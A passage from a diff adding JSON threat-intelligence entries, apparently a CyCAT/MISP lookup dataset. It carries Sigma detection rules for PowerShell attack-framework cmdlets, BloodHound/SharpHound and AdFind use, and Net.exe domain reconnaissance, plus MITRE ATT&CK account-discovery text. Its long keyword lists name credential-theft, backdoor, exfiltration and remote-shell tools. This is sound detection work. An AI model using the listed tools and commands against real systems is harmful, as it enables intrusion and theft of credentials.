+                            "link": "http://www.botvrij.eu/data/feed-osint/0319b483-5973-4932-91ea-5a44c2975b24.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1621181463",
+                            "uuid": "0319b483-5973-4932-91ea-5a44c2975b24",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
+                        "lookup_data": {
+                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
+                            "raw": "author: Sean Metcalf, Florian Roth, Bartlomiej Czyz @bczyz1, oscd.community, Nasreddine\n  Bencherchali, Tim Shelton, Mustafa Kaan Demir, Georg Lauenstein, Max Altgelt, Tobias\n  Michalski, Austin Songer\ndate: 2017/03/05\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_1:\n    ScriptBlockText|contains:\n    - Get-SystemDriveInfo\n    - C:\\ProgramData\\Amazon\\EC2-Windows\\Launch\\Module\\\n  filter_2:\n    ScriptBlockText|startswith: '# Copyright 2016 Amazon.com, Inc. or its affiliates.\n      All Rights Reserved'\n  selection:\n    ScriptBlockText|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n  type: similar\n- id: 02030f2f-6199-49ec-b258-ea71b07e03dc\n  type: similar\n- id: 6d3f1399-a81c-4409-aff3-1ecfe9330baf\n  type: obsoletes\n- id: 83083ac6-1816-4e76-97d7-59af9a9ae46e\n  type: obsoletes\nstatus: test\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - ScriptBlock\n",
+                            "sigma:id": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
+                            "title": "Malicious PowerShell Commandlets - ScriptBlock",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "83e15192-96d8-476c-aa39-0317de8dba80",
+                        "lookup_data": {
+                            "description": "OSINT - Uber Breach & Attack Analysis",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/83e15192-96d8-476c-aa39-0317de8dba80.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1666020853",
+                            "uuid": "83e15192-96d8-476c-aa39-0317de8dba80",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "02773bed-83bf-469f-b7ff-e676e7d78bab",
+                        "lookup_data": {
+                            "description": "Detects default file names outputted by the BloodHound collection tool SharpHound",
+                            "raw": "author: C.J. May\ndate: 2022/08/09\ndescription: Detects default file names outputted by the BloodHound collection tool\n  SharpHound\ndetection:\n  condition: 1 of selection*\n  selection1:\n    TargetFilename|endswith:\n    - _BloodHound.zip\n    - _computers.json\n    - _containers.json\n    - _domains.json\n    - _gpos.json\n    - _groups.json\n    - _ous.json\n    - _users.json\n  selection2:\n    TargetFilename|contains|all:\n    - BloodHound\n    - .zip\nfalsepositives:\n- Unknown\nid: 02773bed-83bf-469f-b7ff-e676e7d78bab\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/08/09\nreferences:\n- https://academy.hackthebox.com/course/preview/active-directory-bloodhound/bloodhound--data-collection\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.001\n- attack.t1069.002\n- attack.execution\n- attack.t1059.001\ntitle: BloodHound Collection Files\n",
+                            "sigma:id": "02773bed-83bf-469f-b7ff-e676e7d78bab",
+                            "title": "BloodHound Collection Files",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9a132afa-654e-11eb-ae93-0242ac130002",
+                        "lookup_data": {
+                            "description": "AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain.",
+                            "raw": "author: Janantha Marasinghe (https://github.com/blueteam0ps), FPT.EagleEye Team, omkar72,\n  oscd.community\ndate: 2021/02/02\ndescription: AdFind continues to be seen across majority of breaches. It is used to\n  domain trust discovery to plan out subsequent steps in the attack chain.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - domainlist\n    - trustdmp\n    - dcmodes\n    - adinfo\n    - ' dclist '\n    - computer_pwdnotreqd\n    - objectcategory=\n    - -subnets -f\n    - name=\"Domain Admins\"\n    - '-sc u:'\n    - domainncs\n    - dompol\n    - ' oudmp '\n    - subnetdmp\n    - gpodmp\n    - fspdmp\n    - users_noexpire\n    - computers_active\n    - computers_pwdnotreqd\nfalsepositives:\n- Legitimate admin activity\nid: 9a132afa-654e-11eb-ae93-0242ac130002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://www.joeware.net/freetools/tools/adfind/\n- https://thedfirreport.com/2020/05/08/adfind-recon/\n- https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/\n- https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md\nrelated:\n- id: 75df3b17-8bcc-4565-b89b-c9898acef911\n  type: obsoletes\nstatus: test\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: AdFind Usage Detection\n",
+                            "sigma:id": "9a132afa-654e-11eb-ae93-0242ac130002",
+                            "title": "AdFind Usage Detection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
+                        "lookup_data": {
+                            "description": "Detects command line parameters used by Bloodhound and Sharphound hack tools",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/12/20\ndescription: Detects command line parameters used by Bloodhound and Sharphound hack\n  tools\ndetection:\n  condition: 1 of selection*\n  selection1:\n    Image|contains:\n    - \\Bloodhound.exe\n    - \\SharpHound.exe\n  selection2:\n    CommandLine|contains:\n    - ' -CollectionMethod All '\n    - ' --CollectionMethods Session '\n    - ' --Loop --Loopduration '\n    - ' --PortScanTimeout '\n    - '.exe -c All -d '\n    - Invoke-Bloodhound\n    - Get-BloodHoundData\n  selection3:\n    CommandLine|contains|all:\n    - ' -JsonFolder '\n    - ' -ZipFileName '\n  selection4:\n    CommandLine|contains|all:\n    - ' DCOnly '\n    - ' --NoSaveCache '\n  selection5:\n  - Product|contains: SharpHound\n  - Description|contains: SharpHound\n  - Company|contains:\n    - SpecterOps\n    - evil corp\nfalsepositives:\n- Other programs that use these command line option and accepts an 'All' parameter\nid: f376c8a7-a2d0-4ddc-aa0c-16c17236d962\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://github.com/BloodHoundAD/BloodHound\n- https://github.com/BloodHoundAD/SharpHound\nstatus: test\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.001\n- attack.t1069.002\n- attack.execution\n- attack.t1059.001\ntitle: Bloodhound and Sharphound Hack Tool\n",
+                            "sigma:id": "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
+                            "title": "Bloodhound and Sharphound Hack Tool",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d95de845-b83c-4a9a-8a6a-4fc802ebf6c0",
+                        "lookup_data": {
+                            "description": "Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE",
+                            "raw": "analysis:\n  recommendation: Check if the user that executed the commands is suspicious (e.g.\n    service accounts, LOCAL_SYSTEM)\nauthor: Florian Roth (Nextron Systems), omkar72, @svch0st, Nasreddine Bencherchali\n  (Nextron Systems)\ndate: 2019/01/16\ndescription: Detects suspicious reconnaissance command line activity on Windows systems\n  using Net.EXE\ndetection:\n  condition: selection_img and (all of selection_group_* or all of selection_accounts_*)\n  selection_accounts_flags:\n    CommandLine|contains: ' /do'\n  selection_accounts_root:\n    CommandLine|contains: ' accounts '\n  selection_group_flags:\n    CommandLine|contains:\n    - domain admins\n    - ' administrator'\n    - ' administrateur'\n    - enterprise admins\n    - Exchange Trusted Subsystem\n    - Remote Desktop Users\n    - \"Utilisateurs du Bureau \\xE0 distance\"\n    - Usuarios de escritorio remoto\n    - ' /do'\n  selection_group_root:\n    CommandLine|contains:\n    - ' group '\n    - ' localgroup '\n  selection_img:\n  - Image|endswith:\n    - \\net.exe\n    - \\net1.exe\n  - OriginalFileName:\n    - net.exe\n    - net1.exe\nfalsepositives:\n- Inventory tool runs\n- Administrative activity\nfields:\n- CommandLine\n- ParentCommandLine\nid: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/02/01\nreferences:\n- https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/\n- https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/\n- https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\ntitle: Suspicious Group And Account Reconnaissance Activity Using Net.EXE\n",
+                            "sigma:id": "d95de845-b83c-4a9a-8a6a-4fc802ebf6c0",
+                            "title": "Suspicious Group And Account Reconnaissance Activity Using Net.EXE",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "968eef52-9cff-4454-8992-1e74b9cbad6c",
+                        "lookup_data": {
+                            "description": "Detects activity as \"net user administrator /domain\" and \"net group domain admins /domain\"",
+                            "raw": "author: Florian Roth (Nextron Systems), Jack Croock (method), Jonhnathan Ribeiro (improvements),\n  oscd.community\ndate: 2017/03/07\ndescription: Detects activity as \"net user administrator /domain\" and \"net group domain\n  admins /domain\"\ndetection:\n  condition: selection\n  selection:\n    AccessMask: '0x2d'\n    EventID: 4661\n    ObjectName|endswith:\n    - '-500'\n    - '-512'\n    ObjectName|startswith: S-1-5-21-\n    ObjectType:\n    - SAM_USER\n    - SAM_GROUP\nfalsepositives:\n- Administrator activity\nid: 968eef52-9cff-4454-8992-1e74b9cbad6c\nlevel: high\nlogsource:\n  definition: The volume of Event ID 4661 is high on Domain Controllers and therefore\n    \"Audit SAM\" and \"Audit Kernel Object\" advanced audit policy settings are not configured\n    in the recommendations for server systems\n  product: windows\n  service: security\nmodified: 2022/08/22\nreferences:\n- https://findingbad.blogspot.de/2017/01/hunting-what-does-it-look-like.html\nstatus: test\ntags:\n- attack.discovery\n- attack.t1087.002\n- attack.t1069.002\n- attack.s0039\ntitle: Reconnaissance Activity\n",
+                            "sigma:id": "968eef52-9cff-4454-8992-1e74b9cbad6c",
+                            "title": "Reconnaissance Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "02030f2f-6199-49ec-b258-ea71b07e03dc",
+                        "lookup_data": {
+                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/02\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n  type: derived\n- id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - ProcessCreation\n",
+                            "sigma:id": "02030f2f-6199-49ec-b258-ea71b07e03dc",
+                            "title": "Malicious PowerShell Commandlets - ProcessCreation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "21875073-b0ee-49e3-9077-1e2a885359af",
+                        "lookup_data": {
+                            "capec": "CAPEC-575",
+                            "mitre-attack-id": "T1087.002",
+                            "mitre-cti:description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.",
+                            "mitre-cti:name": "Domain Account",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['ExtraHop', 'Miriam Wiesner, @miriamxyra, Microsoft Security'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af', 'created': '2020-02-21T21:08:26.480Z', 'x_mitre_version': '1.1', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1087.002', 'url': 'https://attack.mitre.org/techniques/T1087/002'}, {'url': 'https://capec.mitre.org/data/definitions/575.html', 'source_name': 'capec', 'external_id': 'CAPEC-575'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\\n\\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups.', 'modified': '2022-08-25T13:04:00.863Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Domain Account', 'x_mitre_detection': 'System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'discovery'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Command: Command Execution', 'Process: Process Creation', 'Network Traffic: Network Traffic Content', 'Group: Group Enumeration', 'Process: OS API Execution'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
+                        "lookup_data": {
+                            "description": "Detects execution of Net.exe, whether suspicious or benign.",
+                            "raw": "author: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community\n  (improvements)\ndate: 2019/01/16\ndescription: Detects execution of Net.exe, whether suspicious or benign.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - ' group'\n    - ' localgroup'\n    - ' user'\n    - ' view'\n    - ' share'\n    - ' accounts'\n    - ' stop '\n    - ' start'\n  selection_img:\n  - Image|endswith:\n    - \\net.exe\n    - \\net1.exe\n  - OriginalFileName:\n    - net.exe\n    - net1.exe\nfalsepositives:\n- Will need to be tuned. If using Splunk, I recommend | stats count by Computer,CommandLine\n  following the search for easy hunting by computer/CommandLine.\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/11\nreferences:\n- https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n- https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n- https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n- https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1007\n- attack.t1049\n- attack.t1018\n- attack.t1135\n- attack.t1201\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1087.001\n- attack.t1087.002\n- attack.lateral_movement\n- attack.t1021.002\n- attack.s0039\ntitle: Net.exe Execution\n",
+                            "sigma:id": "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
+                            "title": "Net.exe Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "35ba1d85-724d-42a3-889f-2e2362bcaf23",
+                        "lookup_data": {
+                            "description": "Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs",
